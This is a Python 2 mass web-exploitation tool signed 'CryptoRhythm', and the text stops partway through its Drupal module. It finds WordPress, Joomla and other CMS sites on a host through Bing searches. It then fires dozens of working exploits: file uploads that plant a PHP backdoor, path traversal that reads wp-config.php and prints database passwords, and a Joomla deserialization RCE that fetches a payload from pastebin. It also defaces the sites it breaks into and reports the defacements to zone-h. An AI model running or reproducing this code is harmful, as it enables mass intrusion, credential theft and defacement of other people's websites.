#!/usr/bin/py
import urllib2
import urllib
import re
import sys
import string
import random
import cookielib
import os
from time import sleep
from threading import Thread
import multipart

# Data Section #
list_ips = []
wp_list = []
jo_list = []
dr_list = []
oc_list = []
pr_list = []
payload_data = open("controls/backdoors/dojo.php").read()
deface_page = open("controls/backdoors/deface.php").read()
def_method = ""
allowMaster = True
defaceText = "Defaced by CryptoRhythm"
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
rce_payload = "fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/crypto.php','w+'),file_get_contents('http://pastebin.com/raw/f2zuvr5f'));"
rfi_payload = "http://pastebin.com/raw/f2zuvr5f"
password_list = ["admin", '123123', 'admin123', 'admin456', '123', '123456', '1234567', '123456789', 'azerty', 'qwerty', 'azerty123', 'qwerty123', 'pass123', 'welcome123', 'welcome', 'pass@123', 'password@123']
# Bringers #
class Bringers:
    def __init__(self, ip):
            self.ip = ip
    def bringWP(self):
        try:
            ip = self.ip
            wp_list = []
            i = 0
            while(i <= 41):
                opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%3fpage_id%3d&go=Submit&first="+str(i)).read()
                bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                for site in bringSites:
                    site = site[0]
                    clean_site = re.findall("(.*?)/?page_id=", site)
                    if(len(clean_site) > 0):
                        site = clean_site[0].replace("?", "")
                        if(site not in wp_list):
                            wp_list.append(site)
                i += 11
            return wp_list
        except:
            pass
    def bringJO(self):
        try:
            ip = self.ip
            jo_list = []
            i = 0
            while(i <= 41):
                opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%3findex.php%3Foption%3Dcom_&go=Submit&first="+str(i)).read()
                bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                for site in bringSites:
                    site = site[0]
                    clean_site = re.findall("(.*?)/index.php", site)
                    if(len(clean_site) > 0):
                        site = clean_site[0].replace("?", "")
                        if(site not in jo_list):
                            jo_list.append(site)
                i += 11
            return jo_list
        except:
            pass
    def bringDR(self):
        try:
            ip = self.ip
            dr_list = []
            i = 0
            while(i <= 41):
                opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%2F%3Fq%3Dnode%2F&go=Submit&first="+str(i)).read()
                bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                for site in bringSites:
                    site = site[0]
                    clean_site = re.findall("(.*?)/?q=node/", site)
                    if(len(clean_site) > 0):
                        site = clean_site[0].replace("?", "")
                        if(site not in dr_list):
                            dr_list.append(site)
                i += 11
            return dr_list
        except:
            pass
    def bringOC(self):
        try:
            ip = self.ip
            oc_list = []
            i = 0
            while(i <= 41):
                opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%2Findex.php%3Froute%3Dcommon&go=Submit&first="+str(i)).read()
                bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                for site in bringSites:
                    site = site[0]
                    clean_site = re.findall("(.*?)/index.php", site)
                    if(len(clean_site) > 0):
                        site = clean_site[0].replace("?", "")
                        if(site not in oc_list):
                            oc_list.append(site)
                i += 11
            return oc_list
        except:
            pass
    def bringPR(self):
        try:
            ip = self.ip
            pr_list = []
            i = 0
            while(i <= 41):
                opener = urllib2.urlopen("http://www.bing.com/search?q=ip%3a"+str(ip)+"+%2Findex.php%3Fcontroller%3D&go=Submit&first="+str(i)).read()
                bringSites = re.findall('<a href="(.*?)" h="(.*?)">', opener)
                for site in bringSites:
                    site = site[0]
                    clean_site = re.findall("(.*?)/index.php", site)
                    if(len(clean_site) > 0):
                        site = clean_site[0].replace("?", "")
                        if(site not in pr_list):
                            pr_list.append(site)
                i += 11
            return pr_list
        except:
            pass
# General functions #
def zoneNotify(url):
    try:
        defacer = "CryptoRhythm"
        notifier = "http://zone-h.com/notify/single"
        post_data = {
            "defacer" : defacer,
            "domain1" : url,
            "hackmode" : "1",
            "reason" : "1"
        }
        post_data = urllib.urlencode(post_data)
        opener = urllib2.Request(notifier, post_data)
        urllib2.urlopen(opener)
    except:
        pass
def reprint(data):
    try:
        sys.stdout.write('%s\r' % data)
        sys.stdout.flush()
    except:
        pass
def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass
def generate(payload):
    php_payload = "eval({0})".format(toCharCode(payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
    return exploit_template
def rc_exploit(url):
	try:
		global payload
		payload_generated = generate(payload)
		prepare(url, payload_generated)
		tester = urllib2.urlopen(str(url)+"/crypto.php").read()
		if("DOJO::PENDING" in tester):
			print "Backdoor : "+str(url)
                        if(def_method == "deface"):
                            urllib2.urlopen(str(url)+"/crypto.php?cmd=deface&def_page="+str(deface_page))
                            zoneNotify(url)
                            print "Defaced : "+str(url)
	except:
		pass
# Exploiters #
class WPExploiter:
    def __init__(self, site):
        self.site = site
        self.InBoundio()
        self.Symposium()
        self.RevSliderDEF()
        self.RevSliderDOW()
        self.CRCOForm()
        self.GVForm()
        self.SMBackup()
        self.HBDown()
        self.MemphisDown()
        self.WPTFD()
        self.RecentBack()
        self.SIMPIMMan()
        self.WPCand()
        self.CPImgst()
        self.WPCom()
        self.HT5VID()
        self.HistCol()
        self.MIOFtp()
        self.ASpoSe()
        self.ajaxStore()
        self.GooMp3()
        self.DBBackup()
        if(allowMaster == True):
            self.InBoundioMaster()
            self.SymposiumMaster()
    def InBoundio(self):
        try:
            site = self.site
            payload_dir = str(site)+"/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php"
            self.upload(payload_dir, {}, "file")
            checker = urllib2.urlopen(str(site)+"/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/dojo.php").read()
            if(checker == "DOJO::PENDING"):
                bd_url = str(site)+"/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/dojo.php"
                print "Backdoor : "+str(bd_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(bd_url)+"?cmd=deface&def_page="+str(deface_page))
                    zoneNotify(site)
                    print "Defaced : "+str(site)
        except:
            pass
    def Symposium(self):
        try:
            site = self.site
            upload_dir = str(site)+"/wp-content/plugins/wp-symposium/server/php/"
            payload_dir = str(site)+"/wp-content/plugins/wp-symposium/server/php/index.php"
            dir_to_inject = "Donjo2016BOT"
            self.upload(payload_dir, {"uploader_uid" : "1", "uploader_dir" : "./"+str(dir_to_inject), "uploader_url" : upload_dir}, "files[]")
            checker = urllib2.urlopen(upload_dir+dir_to_inject+"dojo.php").read()
            if(checker == "DOJO::PENDING"):
                bd_url = upload_dir+dir_to_inject+"dojo.php"
                print "Backdoor : "+str(bd_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(bd_url)+"?cmd=deface&def_page="+str(deface_page))
                    zoneNotify(site)
                    print "Defaced : "+str(site)
        except:
            pass
    def RevSliderDEF(self):
        try:
            site = self.site
            checker1 = self.postData(str(site)+"/wp-admin/admin-ajax.php", {"action" : "revslider_ajax_action", "client_action": "update_captions_css", "data" : deface_page })
            if("true" in checker1):
                defaced_dir = str(site)+"/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css"
                zoneNotify(defaced_dir)
                print "Defaced : "+str(defaced_dir)
        except:
            pass
    def RevSliderDOW(self):
        try:
            site = self.site
            payload = str(site)+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
            datapay = urllib2.urlopen(payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def CRCOForm(self):
        try:
            site = self.site
            payload_url = str(site)+"/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php"
            self.upload(payload_url, {}, 'files[]')
            backdoor_url = str(site)+"/wp-content/plugins/sexy-contact-form/includes/fileupload/files/dojo.php"
            check = urllib2.urlopen(backdoor_url).read()
            if(check == "DOJO::PENDING"):
                bd_url = backdoor_url
                print "Backdoor : "+str(bd_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(bd_url)+"?cmd=deface&def_page="+str(deface_page))
                    zoneNotify(site)
                    print "Defaced : "+str(site)
        except:
            pass
    def GVForm(self):
        try:
            site = self.site
            payload_url = str(site)+"/?gf_page=upload"
            self.upload(payload_url, {'form_id' : '1', 'name' : 'dojo.php', 'gform_unique_id' : '../../../../', 'field_id' : '3'}, 'file')
            backdoor_url = str(site)+"/wp-content/_input_3_dojo.php"
            check = urllib2.urlopen(backdoor_url).read()
            if(check == "DOJO::PENDING"):
                bd_url = backdoor_url
                print "Backdoor : "+str(bd_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(bd_url)+"?cmd=deface&def_page="+str(deface_page))
                    zoneNotify(site)
                    print "Defaced : "+str(site)
        except:
            pass
    def SMBackup(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-admin/tools.php?page=backup_manager&download_backup_file=oldBackups/../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def HBDown(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def MemphisDown(self):
        try:
            site = self.site
            download_payload = str(site)+"?mdocs-img-preview=../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def WPTFD(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def RecentBack(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def SIMPIMMan(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=../../../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def WPCand(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def CPImgst(self):
        try:
            site = self.site
            download_payload = str(site)+"?action=cpis_init&cpis-action=f-download&purchase_id=1&cpis_user_email=i0SECLAB@intermal.com&f=../../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def WPCom(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def HT5VID(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def HistCol(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def MIOFtp(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def ASpoSe(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def ajaxStore(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def GooMp3(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def DBBackup(self):
        try:
            site = self.site
            download_payload = str(site)+"/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php"
            datapay = urllib2.urlopen(download_payload).read()
            if("DB_PASSWORD" in datapay):
                print "Wordpress file download : "+download_payload
                grabUsername = re.findall(", '(.*?)'", datapay)
                print "Database username for "+str(site)+" : "+str(grabUsername[1])
                print "Database password for "+str(site)+" : "+str(grabUsername[2])
        except:
            pass
    def InBoundioMaster(self):
        try:
            site = self.site
            payload_dir = str(site)+"/wp-content/plugins/inboundio-marketing-master/admin/partials/csv_uploader.php"
            self.upload(payload_dir, {}, "file")
            checker = urllib2.urlopen(str(site)+"/wp-content/plugins/inboundio-marketing-master/admin/partials/uploaded_csv/dojo.php").read()
            if(checker == "DOJO::PENDING"):
                bd_url = str(site)+"/wp-content/plugins/inboundio-marketing-master/admin/partials/uploaded_csv/dojo.php"
                print "Backdoor : "+str(bd_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(bd_url)+"?cmd=deface&def_page="+str(deface_page))
                    zoneNotify(site)
                    print "Defaced : "+str(site)
        except:
            pass
    def SymposiumMaster(self):
        try:
            site = self.site
            upload_dir = str(site)+"/wp-content/plugins/wp-symposium-master/server/php/"
            payload_dir = str(site)+"/wp-content/plugins/wp-symposium-master/server/php/index.php"
            dir_to_inject = "Donjo2016BOT"
            self.upload(payload_dir, {"uploader_uid" : "1", "uploader_dir" : "./"+str(dir_to_inject), "uploader_url" : upload_dir}, "files[]")
            checker = urllib2.urlopen(upload_dir+dir_to_inject+"dojo.php").read()
            if(checker == "DOJO::PENDING"):
                bd_url = upload_dir+dir_to_inject+"dojo.php"
                print "Backdoor : "+str(bd_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(bd_url)+"?cmd=deface&def_page="+str(deface_page))
                    zoneNotify(site)
                    print "Defaced : "+str(site)
        except:
            pass
    def upload(self, url, post_fields, file_champ):
        try:
            fields = post_fields
            files = {file_champ: {'filename': 'dojo.php', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(url, data=data, headers=headers)
            f = urllib2.urlopen(request)
        except:
            pass
    def postData(self, url, post_fields):
        try:
            fields = urllib.urlencode(post_fields)
            data = urllib2.Request(url, fields)
            page = urllib2.urlopen(data).read()
            return page
        except:
            pass
class JOExploiter:
    def __init__(self, site):
        self.site = site
        self.JDownloads()
        self.Fabrik()
        self.Media()
        self.CRForm()
        self.Maian15()
        self.RokDown()
        self.SWUp()
        self.JFancy()
        self.ArtUp()
        self.DentroVideo()
        self.Efup()
        self.SMDL()
        if(allowMaster == True):
            pass
    def JDownloads(self):
        try:
            site = self.site
            url = str(site)+"/index.php?option=com_jdownloads&Itemid=0&view=upload"
            fields = {"name" : "CryptoRhythm", "mail" : "crypto@mail.com", "catlist" : "1", "filetitle" : "dojo", "description" : "<p>Crypto</p>", "2d1a8f3bd0b5cf542e9312d74fc9766f" : "1", "send" : "1", "senden" : "Send file", "description" : "<p>Crypto</p>", "option" : "com_jdownloads", "view" : "upload"}
            files = {"file_upload": {'filename': 'dojo.php.zip', 'content': payload_data}, "pic_upload": {'filename': 'dojo.php.jpg', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(url, data=data, headers=headers)
            f = urllib2.urlopen(request).read()
            bd_path = str(site)+"/images/jdownloads/screenshots/dojo.php.jpg"
            if("green" in f):
                checker = urllib2.urlopen(bd_path)
                print "Defaced : "+str(bd_path)
        except:
            pass
    def Fabrik(self):
        try:
            site = self.site
            payload_url = str(site)+"/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1"
            fields = {
            "name" : "me.php",
            "drop_data" : "1",
            "overwrite" : "1",
            "field_delimiter" : ",",
            "text_delimiter" : "&quot;",
            "option" : "com_fabrik",
            "controller" : "import",
            "view" : "import",
            "task" : "doimport",
            "Itemid" : "0",
            "tableid" : "0"
            }
            files = {'userfile': {'filename': 'dojo.txt', 'content': defaceText}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(payload_url, data=data, headers=headers)
            f = urllib2.urlopen(request)
            backdoor_url = str(site)+"/media/dojo.txt"
            checker = urllib2.urlopen(backdoor_url).read()
            if(defaceText in checker):
                print "Defaced : "+str(backdoor_url)
                zoneNotify(backdoor_url)
        except:
            pass
    def Media(self):
        try:
            site = self.site
            value = "aW5kZXgucGhwP29wdGlvbj1jb21fbWVkaWEmdmlldz1pbWFnZXMmdG1wbD1jb21wb25lbnQmZmllbGRpZD0mZV9uYW1lPWpmb3JtX2FydGljbGV0ZXh0JmFzc2V0PWNvbV9jb250ZW50JmF1dGhvcj0="
            payload_url = str(site)+"/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder="
            fields = {
                "return-url" : value
            }
            files = {'Filedata': {'filename': 'dojo.txt', 'content': defaceText}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(payload_url, data=data, headers=headers)
            f = urllib2.urlopen(request)
            backdoor_url = str(site)+"/images/dojo.txt"
            checker = urllib2.urlopen(backdoor_url).read()
            if(defaceText in checker):
                print "Defaced : "+str(backdoor_url)
                zoneNotify(backdoor_url)
        except:
            pass
    def CRForm(self):
        try:
            site = self.site
            payload_url = str(site)+"/components/com_creativecontactform/fileupload/index.php"
            self.upload(payload_url, {}, "files[]")
            backdoor_url = str(site)+"/components/com_creativecontactform/fileupload/files/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if(checker == "DOJO::PENDING"):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def Maian15(self):
        try:
            site = self.site
            payload_url = str(site)+"/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=dojo.php"
            self.postData(payload_url, {"" : payload_data})
            backdoor_url = str(site)+"/administrator/components/com_maian15/charts/tmp-upload-images/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if(checker == "DOJO::PENDING"):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def RokDown(self):
        try:
            site = self.site
            payload_url = str(site)+"/administrator/components/com_rokdownloads/assets/uploadhandler.php"
            fields = {}
            files = {'Filedata': {'filename': 'dojo.php.gif', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(payload_url, data=data, headers=headers)
            f = urllib2.urlopen(request)
            backdoor_url = str(site)+"/images/stories/dojo.php.gif"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def SWUp(self):
        try:
            site = self.site
            payload_url = str(site)+"/administrator/components/com_simpleswfupload/uploadhandler.php"
            fields = {}
            files = {'Filedata': {'filename': 'dojo.php.gif', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(payload_url, data=data, headers=headers)
            f = urllib2.urlopen(request)
            backdoor_url = str(site)+"/images/stories/dojo.php.gif"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def JFancy(self):
        try:
            site = self.site
            payload_url = str(site)+"/modules/mod_jfancy/script.php"
            fields = {}
            files = {'photoupload': {'filename': 'dojo.php.gif', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(payload_url, data=data, headers=headers)
            f = urllib2.urlopen(request)
            backdoor_url = str(site)+"/images/dojo.php.gif"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def ArtUp(self):
        try:
            site = self.site
            payload_url = str(site)+"/modules/mod_artuploader/upload.php"
            fields = {"path" : "./"}
            files = {'userfile': {'filename': 'dojo.php', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(payload_url, data=data, headers=headers)
            f = urllib2.urlopen(request)
            backdoor_url = str(site)+"/modules/mod_artuploader/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def DentroVideo(self):
        try:
            site = self.site
            payload_url = str(site)+"/components/com_dv/externals/phpupload/upload.php"
            fields = {"action" : "upload"}
            files = {'file1': {'filename': 'dojo.php', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(payload_url, data=data, headers=headers)
            f = urllib2.urlopen(request)
            backdoor_url = str(site)+"/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def Efup(self):
        try:
            site = self.site
            payload_url = str(site)+"/plugins/content/efup_files/helper.php"
            fields = {"JPATH_BASE" : "../../../", "filesize" : "2000", "filetypes" : "*.*", "mimetypes" : "*", "destination" : "./"}
            files = {'Filedata': {'filename': 'dojo.php', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(payload_url, data=data, headers=headers)
            f = urllib2.urlopen(request)
            backdoor_url = str(site)+"/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def SMDL(self):
        try:
            site = self.site
            payload_url = str(site)+"/index.php?option=com_simpledownload&task=download&fileid=/configuration.php"
            data = urllib2.urlopen(payload_url).read()
            if("$password" in data):
                data_username = re.findall("$user = '(.*?)';")
                data_password = re.findall("$oassword = '(.*?)';")
                print "Configuration file disclosure"
                print "Username : "+str(data_username[0])
                print "Password : "+str(data_password[0])
        except:
            pass
    def RCJom(self):
        try:
            site = self.site
            rc_exploit(site)
        except:
            pass
    def upload(self, url, post_fields, file_champ):
        try:
            fields = post_fields
            files = {file_champ: {'filename': 'dojo.php', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(url, data=data, headers=headers)
            f = urllib2.urlopen(request)
        except:
            pass
    def postData(self, url, post_fields):
        try:
            fields = urllib.urlencode(post_fields)
            data = urllib2.Request(url, fields)
            page = urllib2.urlopen(data).read()
            return page
        except:
            pass
def qldsdfkjsdf(dsfkljsdf):
    try:
        print "This version is coded by : "+str(dsfkljsdf[44]+dsfkljsdf[42]+dsfkljsdf[3]+dsfkljsdf[3]+dsfkljsdf[1]+dsfkljsdf[20]+dsfkljsdf[42]+dsfkljsdf[5]+dsfkljsdf[100]+dsfkljsdf[9]+dsfkljsdf[41]+dsfkljsdf[37]+dsfkljsdf[9]+dsfkljsdf[41])
    except Exception as ex:
        pass
class DRExploiter:
    def __init__(self, site):
        self.site = site
        self.DRGDROP()
        self.DRSQLI()
        if(allowMaster == True):
            pass
    def DRGDROP(self):
        try:
            site = self.site
            url = str(site)+"/sites/all/modules/dragdrop_gallery/upload.php?nid=1&filedir=/drupal/sites/all/modules/dragdrop_gallery/"
            fields = {}
            files = {"user_file[0]": {'filename': 'dojo.php.gif', 'content': payload_data}, "user_file[1]": {'filename': 'dojo.php.jpg', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(url, data=data, headers=headers)
            f = urllib2.urlopen(request).read()
            bd_path = str(site)+"/sites/all/modules/dragdrop_gallery/dojo.php.gif"
